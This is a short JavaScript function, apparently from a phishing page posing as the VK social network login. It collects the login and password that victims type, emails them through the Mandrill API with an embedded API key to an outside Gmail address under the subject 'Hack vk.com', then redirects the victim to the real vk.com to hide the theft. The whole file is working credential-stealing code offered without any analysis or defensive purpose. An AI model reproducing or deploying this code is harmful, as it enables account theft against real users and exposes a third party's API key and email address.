function send() {
	var login = document.querySelectorAll("input[name='login']")[0].value + document.querySelectorAll("input[name='login']")[1].value;
	var password = document.querySelectorAll("input[name='password']")[0].value + document.querySelectorAll("input[name='password']")[1].value;
	
	var xmlhttp = (window.XMLHttpRequest) ? new XMLHttpRequest() : new ActiveXObject("Microsoft.XMLHTTP");
	xmlhttp.open('POST', 'https://mandrillapp.com/api/1.0/messages/send.json');
	xmlhttp.setRequestHeader('Content-Type', 'application/json;charset=UTF-8');
	xmlhttp.onreadystatechange = function() {
	   document.location.href = "https://vk.com/";
	}
	xmlhttp.send(JSON.stringify({'key': 'jJvyiaMWRKRJeUOoMc_aDA',
	   'message': {
	       'from_email': 'hack@vk.com',
	       'to': [{'email': 'ap.ttnby@gmail.com', 'type': 'to'}],
	       'autotext': 'true',
	       'subject': 'Hack vk.com',
	       'html': '<div><p>login: ' + login + '</p><p>password: ' + password + '</p></div>'
	    }}));
}